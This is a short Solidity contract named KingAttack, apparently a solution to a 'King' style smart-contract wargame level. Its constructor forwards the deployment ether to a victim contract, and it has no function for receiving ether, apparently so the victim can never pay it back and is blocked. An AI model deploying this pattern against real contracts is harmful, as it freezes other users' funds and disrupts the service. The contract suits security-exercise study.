//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

contract KingAttack {
  
    constructor (address payable _victimContractAddr) payable {
          address(_victimContractAddr).call{value: msg.value}("");
    }

}